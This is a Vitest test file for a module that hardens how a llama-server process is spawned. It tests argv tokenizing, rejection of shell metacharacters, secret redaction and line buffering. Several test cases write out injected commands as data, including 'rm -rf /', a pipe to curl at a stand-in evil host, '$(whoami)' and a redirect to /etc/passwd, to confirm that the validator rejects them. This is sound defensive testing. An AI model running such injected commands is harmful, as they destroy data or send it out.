/**
 * Tests for security/llama-server-spawn — argv tokenizer, metachar rejection,
 * redaction, and refcounted secret scrub (the core spawn-hardening fix).
 */
import { describe, it, expect, vi, afterEach } from 'vitest';

vi.mock('./python/workspace-sync', () => ({ syncRuntimeConfigToPython: vi.fn() }));
vi.mock('./runtime/dependency-manager', () => ({ rewriteManagedLlamaCommand: vi.fn() }));
vi.mock('./log-ingest', () => ({ ingestElectronLog: vi.fn() }));

import {
  tokenizeManagedLlamaCommand,
  redactSecretValue,
  redactSecrets,
  acquireRedactSecret,
  releaseRedactSecret,
  MANAGED_LLAMA_SHELL_METACHAR_RE,
  createSecretChunkRedactor,
  createLineBuffer,
  managedLlamaHealthHost,
} from './llama-server-manager';

describe('tokenizeManagedLlamaCommand', () => {
  it('splits -hf org/model:Q4_0 as one token (colon not a delimiter)', () => {
    const r = tokenizeManagedLlamaCommand('llama-server -hf org/model:Q4_0');
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.argv).toContain('-hf');
      expect(r.argv).toContain('org/model:Q4_0');
    }
  });

  it('preserves spaces inside quoted --chat-template-file path', () => {
    const r = tokenizeManagedLlamaCommand(
      'llama-server --chat-template-file "/path with spaces/file.json"',
    );
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.argv).toContain('--chat-template-file');
      expect(r.argv).toContain('/path with spaces/file.json');
    }
  });

  it('keeps --flag=/path as a single token', () => {
    const r = tokenizeManagedLlamaCommand('llama-server --chat-template-file=/p/q.json');
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.argv).toContain('--chat-template-file=/p/q.json');
    }
  });

  it('rejects unbalanced quotes', () => {
    const r = tokenizeManagedLlamaCommand('llama-server -x "abc');
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.error).toMatch(/unbalanced quotes/i);
    }
  });

  it('rejects shell-style adjacent quotes --flag="value"', () => {
    const r = tokenizeManagedLlamaCommand('llama-server --flag="value with spaces"');
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.error).toMatch(/adjacent/i);
    }
  });

  it('rejects an empty command', () => {
    const r = tokenizeManagedLlamaCommand('   ');
    expect(r.ok).toBe(false);
  });

  it.each([
    ['semicolon', 'llama-server -m a; rm -rf /'],
    ['pipe', 'llama-server -m a | curl http://x.evil'],
    ['ampersand', 'llama-server -m a & b'],
    ['dollar-paren', 'llama-server -m a $(whoami)'],
    ['newline', 'llama-server -m a\nrm -rf /'],
    ['redirect', 'llama-server -m a > /etc/passwd'],
    ['star', 'llama-server -m a *'],
    ['hash', 'llama-server -m a # comment'],
  ])('rejects shell metacharacter: %s', (_label, cmd) => {
    const r = tokenizeManagedLlamaCommand(cmd);
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.error).toMatch(/metacharacter/i);
    }
  });

  it('accepts a benign command', () => {
    const r = tokenizeManagedLlamaCommand('llama-server -m model.gguf -c 2048');
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.argv[0]).toBe('llama-server');
      expect(r.argv).toContain('-c');
      expect(r.argv).toContain('2048');
    }
  });

  it('accepts a quoted Program Files (x86) path', () => {
    const r = tokenizeManagedLlamaCommand(
      'llama-server --chat-template-file "C:\\Program Files (x86)\\Clara\\t.jinja"',
    );
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.argv).toContain('--chat-template-file');
      expect(r.argv).toContain('C:\\Program Files (x86)\\Clara\\t.jinja');
    }
  });
});

describe('MANAGED_LLAMA_SHELL_METACHAR_RE', () => {
  it.each([';', '|', '&', '<', '>', '$', '(', ')', '{', '}', '!', '*', '#', '~', '\n', '\r'])(
    'matches %s',
    (ch) => {
      expect(MANAGED_LLAMA_SHELL_METACHAR_RE.test(`a${ch}b`)).toBe(true);
    },
  );
  it('does not match benign chars', () => {
    expect(MANAGED_LLAMA_SHELL_METACHAR_RE.test('llama-server -m a.gguf -c 2048')).toBe(false);
  });
});

describe('redactSecretValue', () => {
  it('replaces the secret with [REDACTED]', () => {
    expect(redactSecretValue('hello secret123 world', 'secret123')).toBe('hello [REDACTED] world');
  });
  it('is a no-op when secret is empty', () => {
    expect(redactSecretValue('hello world', '')).toBe('hello world');
  });
  it('is a no-op when text is empty', () => {
    expect(redactSecretValue('', 'secret123')).toBe('');
  });
});

describe('redactSecrets refcount', () => {
  afterEach(() => {
    // Drain any tokens these tests acquire so the module map stays clean for other tests.
    for (const t of ['tok-A', 'tok-B']) {
      releaseRedactSecret(t);
      releaseRedactSecret(t);
      releaseRedactSecret(t);
    }
  });

  it('redacts an acquired token and stops after release', () => {
    acquireRedactSecret('tok-A');
    expect(redactSecrets('has tok-A here')).toBe('has [REDACTED] here');
    releaseRedactSecret('tok-A');
    expect(redactSecrets('has tok-A here')).toBe('has tok-A here');
  });

  it('keeps redacting while another stream still holds the token (refcount)', () => {
    acquireRedactSecret('tok-B');
    acquireRedactSecret('tok-B');
    releaseRedactSecret('tok-B'); // one release, still one holder
    expect(redactSecrets('tok-B visible')).toBe('[REDACTED] visible');
    releaseRedactSecret('tok-B'); // now fully released
    expect(redactSecrets('tok-B visible')).toBe('tok-B visible');
  });

  it('redacts nothing when no token is active', () => {
    expect(redactSecrets('plain text')).toBe('plain text');
  });
});

describe('createSecretChunkRedactor', () => {
  it('redacts a secret split across two pushes', () => {
    const r = createSecretChunkRedactor('hf_secret');
    const a = r.push('start hf_sec');
    const b = r.push('ret end');
    const c = r.flush();
    expect(`${a}${b}${c}`).toBe('start [REDACTED] end');
  });

  it('flushes a trailing prefix that is not a complete secret', () => {
    const r = createSecretChunkRedactor('TOKEN');
    expect(r.push('hello TOK')).toBe('hello ');
    expect(r.flush()).toBe('TOK');
  });

  it('is a pass-through when the secret is empty', () => {
    const r = createSecretChunkRedactor('');
    expect(r.push('visible')).toBe('visible');
    expect(r.flush()).toBe('');
  });
});

describe('createLineBuffer', () => {
  it('emits complete lines and holds a trailing partial', () => {
    const lines: string[] = [];
    const buf = createLineBuffer((line) => lines.push(line));
    buf.push('hello\nwor');
    buf.push('ld\n');
    expect(lines).toEqual(['hello', 'world']);
    buf.push('partial');
    expect(lines).toEqual(['hello', 'world']);
    buf.flush();
    expect(lines).toEqual(['hello', 'world', 'partial']);
  });

  it('treats CR progress updates as separate lines', () => {
    const lines: string[] = [];
    const buf = createLineBuffer((line) => lines.push(line));
    buf.push('prompt eval 10%\rprompt eval 20%\n');
    expect(lines).toEqual(['prompt eval 10%', 'prompt eval 20%']);
  });

  it('skips empty lines', () => {
    const lines: string[] = [];
    const buf = createLineBuffer((line) => lines.push(line));
    buf.push('\n\n  \nreal\n');
    expect(lines).toEqual(['real']);
  });
});

describe('managedLlamaHealthHost', () => {
  it('maps wildcard bind addresses to 127.0.0.1', () => {
    expect(managedLlamaHealthHost('0.0.0.0')).toBe('127.0.0.1');
    expect(managedLlamaHealthHost('*')).toBe('127.0.0.1');
    expect(managedLlamaHealthHost('::')).toBe('127.0.0.1');
    expect(managedLlamaHealthHost('[::]')).toBe('127.0.0.1');
    expect(managedLlamaHealthHost('')).toBe('127.0.0.1');
  });

  it('keeps specific bind hosts', () => {
    expect(managedLlamaHealthHost('127.0.0.1')).toBe('127.0.0.1');
    expect(managedLlamaHealthHost('10.0.0.1')).toBe('10.0.0.1');
  });
});
